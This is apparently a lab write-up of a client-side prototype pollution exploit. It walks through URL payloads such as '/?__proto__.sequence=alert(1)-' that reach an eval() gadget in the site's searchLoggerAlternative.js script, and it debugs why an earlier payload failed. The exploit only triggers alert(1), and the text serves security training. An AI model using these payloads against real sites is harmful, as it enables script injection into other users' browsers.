Reconnaissance
1. Testing the standard prototype pollution vector

The first payload tested was:

/?__proto__[foo]=bar

The browser console was then opened and the following command was executed:

Object.prototype

The injected property:

foo: "bar"

was not present.

This indicated that the bracket notation vector was not effective in this application.

Identifying an alternative prototype pollution vector

An alternative syntax was then tested:

/?__proto__.foo=bar

After loading the URL, the following command was executed again:

Object.prototype

This time the object contained:

foo: "bar"

This confirmed that the application was vulnerable to prototype pollution through the following syntax:

__proto__.property=value

Therefore, an attacker can inject arbitrary properties into the global Object.prototype.

Identifying the gadget

The JavaScript files loaded by the application were inspected through:

DevTools → Sources

The relevant JavaScript file was:

searchLoggerAlternative.js

The following code was identified:

async function searchLogger() {
    window.macros = {};

    window.manager = {
        params: $.parseParams(new URL(location)),
        macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }
    };

    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval(
        'if(manager && manager.sequence){ manager.macro('
        + manager.sequence +
        ') }'
    );

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}

The important part is:

let a = manager.sequence || 1;
manager.sequence = a + 1;

followed by:

eval(
    'if(manager && manager.sequence){ manager.macro('
    + manager.sequence +
    ') }'
);

The property:

manager.sequence

is not defined directly when the manager object is created.

This makes it a potential prototype pollution gadget.

Understanding the prototype pollution gadget

JavaScript property lookup searches the object's prototype chain when a property is not found directly on the object.

Therefore, if the attacker pollutes:

Object.prototype.sequence

then:

manager.sequence

can resolve to the attacker-controlled value.

The relationship is:

Object.prototype.sequence
            ↓
       manager.sequence
            ↓
           eval()
Initial exploitation attempt

The following payload was tested:

/?__proto__.sequence=alert(1)

The payload successfully polluted the sequence property, but the JavaScript did not execute.

The browser console displayed a syntax error similar to:

Uncaught (in promise) SyntaxError:
missing ) after argument list

The stack trace pointed to the eval() call inside:

searchLoggerAlternative.js
Debugging the JavaScript execution

A breakpoint was placed on the line containing:

eval(...)

After refreshing the page, the value of:

manager.sequence

was inspected.

The value was:

alert(1)1

This was the key to understanding why the initial payload failed.

The application performs:

let a = manager.sequence || 1;
manager.sequence = a + 1;

Therefore, the attacker-controlled value:

alert(1)

becomes:

alert(1)1

The resulting JavaScript is syntactically invalid when inserted into the eval() expression.

Crafting the final exploit

To compensate for the appended 1, a trailing minus character was added to the injected value.

Final payload:

/?__proto__.sequence=alert(1)-

The application then effectively produces:

alert(1)-1

This is valid JavaScript.

The expression therefore executes the alert(1) function and then evaluates the subtraction operation.

Final payload
/?__proto__.sequence=alert(1)-

The payload exploits the alternative prototype pollution vector:

__proto__.sequence

and injects:

alert(1)-

into the sequence property.

